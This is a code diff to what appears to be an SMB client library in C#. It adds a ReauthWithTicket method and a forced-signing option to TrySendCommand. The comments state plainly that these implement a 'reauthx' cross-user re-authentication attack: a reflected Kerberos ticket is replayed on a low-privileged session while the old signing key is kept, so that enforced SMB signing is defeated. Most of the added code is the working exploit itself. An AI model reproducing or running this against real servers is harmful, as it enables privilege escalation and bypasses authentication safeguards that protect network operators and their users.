@@ -383,6 +383,59 @@ namespace SMBLibrary.Client
 
             return null;
         }
+        /// <summary>
+        /// reauthx-style cross-user re-authentication ([MS-SMB2] 3.2.5.5).
+        /// Sends a reflected Kerberos AP-REQ as a SESSION_SETUP on the current, already authenticated session.
+        /// A vulnerable server accepts the swap but does not re-derive the session signing key, so the session
+        /// keeps signing with the key derived from the base (low privileged) login: enforced SMB signing is defeated.
+        /// Must be called after Login(domainName, userName, password) established the base session.
+        /// </summary>
+        /// <returns>STATUS_SUCCESS if the target accepted the re-authentication.</returns>
+        public NTStatus ReauthWithTicket(byte[] ticket)
+        {
+            if (!m_isConnected || !m_isLoggedIn)
+            {
+                throw new InvalidOperationException("A base session must be established before attempting a re-authentication");
+            }
+
+            // Preserve the low privileged session state: this is the key material we keep using after the swap.
+            ulong baseSessionID = m_sessionID;
+            byte[] baseSigningKey = m_signingKey;
+            byte[] baseSessionKey = m_sessionKey;
+            byte[] baseEncryptionKey = m_encryptionKey;
+            byte[] baseDecryptionKey = m_decryptionKey;
+            bool baseSigningRequired = m_signingRequired;
+            bool baseEncryptSessionData = m_encryptSessionData;
+
+            // The re-authentication must travel unencrypted: the encryption keys no longer match the session
+            // state after the swap. This mirrors reauthx forcing signing-only (SessionFlags &= ~ENCRYPT_DATA).
+            m_encryptSessionData = false;
+
+            SessionSetupRequest request = new SessionSetupRequest();
+            request.SecurityMode = SecurityMode.SigningEnabled;
+            request.SecurityBuffer = ticket;
+
+            // The re-authentication must be signed with the base session key (TreeID == 0 rule), otherwise the
+            // server rejects it with STATUS_ACCESS_DENIED even when it is vulnerable to the swap.
+            Console.WriteLine("[*] reauth: sending re-authentication on session 0x{0:X} (signed: {1})", baseSessionID, (m_signingKey != null));
+            TrySendCommand(request, false, true);
+            SMB2Command response = WaitForCommand(request.MessageID);
+            NTStatus status = (response != null) ? response.Header.Status : NTStatus.STATUS_INVALID_SMB;
+
+            // Always keep the base session id and key material: on success this is what makes the bypass work,
+            // on failure it leaves the connection usable (e.g. for Logoff).
+            m_sessionID = baseSessionID;
+            m_signingKey = baseSigningKey;
+            m_sessionKey = baseSessionKey;
+            m_encryptionKey = baseEncryptionKey;
+            m_decryptionKey = baseDecryptionKey;
+            m_signingRequired = baseSigningRequired;
+            m_encryptSessionData = (status == NTStatus.STATUS_SUCCESS) ? false : baseEncryptSessionData;
+            m_isLoggedIn = true;
+
+            return status;
+        }
+
         public NTStatus Logoff()
         {
             if (!m_isConnected)
@@ -691,6 +744,17 @@ namespace SMBLibrary.Client
 
         internal void TrySendCommand(SMB2Command request, bool encryptData)
         {
+            TrySendCommand(request, encryptData, false);
+        }
+
+        /// <summary>
+        /// forceSign signs a request whose command would normally travel unsigned.
+        /// A re-authentication SESSION_SETUP on a non-zero SessionId must be signed with the key of the
+        /// session it re-authenticates ([MS-SMB2] 3.2.4.1.1; impacket sendSMB signs every TreeID==0 packet
+        /// once signing is activated). This signature is what makes the reauthx bypass work on the wire.
+        /// </summary>
+        internal void TrySendCommand(SMB2Command request, bool encryptData, bool forceSign)
+        {
             if (m_dialect == SMB2Dialect.SMB202 || m_transport == SMBTransportType.NetBiosOverTCP)
             {
                 request.Header.CreditCharge = 0;
@@ -720,18 +784,23 @@ namespace SMBLibrary.Client
             request.Header.MessageID = m_messageID;
             request.Header.SessionID = m_sessionID;
             // [MS-SMB2] If the client encrypts the message [..] then the client MUST set the Signature field of the SMB2 header to zero
-            if (m_signingRequired && !encryptData)
+            bool signRequest = forceSign
+                ? (m_signingKey != null && m_sessionID != 0)
+                : (m_signingRequired && m_sessionID != 0 &&
+                   ((request.CommandName == SMB2CommandName.TreeConnect || request.Header.TreeID != 0) ||
+                    (m_dialect >= SMB2Dialect.SMB300 && request.CommandName == SMB2CommandName.Logoff)));
+            if (signRequest && !encryptData)
             {
-                request.Header.IsSigned = (m_sessionID != 0 && ((request.CommandName == SMB2CommandName.TreeConnect || request.Header.TreeID != 0) ||
-                                                                (m_dialect >= SMB2Dialect.SMB300 && request.CommandName == SMB2CommandName.Logoff)));
-                if (request.Header.IsSigned)
-                {
-                    request.Header.Signature = new byte[16]; // Request could be reused
-                    byte[] buffer = request.GetBytes();
-                    byte[] signature = SMB2Cryptography.CalculateSignature(m_signingKey, m_dialect, buffer, 0, buffer.Length);
-                    // [MS-SMB2] The first 16 bytes of the hash MUST be copied into the 16-byte signature field of the SMB2 Header.
-                    request.Header.Signature = ByteReader.ReadBytes(signature, 0, 16);
-                }
+                request.Header.IsSigned = true;
+                request.Header.Signature = new byte[16]; // Request could be reused
+                byte[] buffer = request.GetBytes();
+                byte[] signature = SMB2Cryptography.CalculateSignature(m_signingKey, m_dialect, buffer, 0, buffer.Length);
+                // [MS-SMB2] The first 16 bytes of the hash MUST be copied into the 16-byte signature field of the SMB2 Header.
+                request.Header.Signature = ByteReader.ReadBytes(signature, 0, 16);
+            }
+            else
+            {
+                request.Header.IsSigned = false;
             }
             TrySendCommand(m_clientSocket, request, encryptData ? m_encryptionKey : null);
             if (m_dialect == SMB2Dialect.SMB202 || m_transport == SMBTransportType.NetBiosOverTCP)
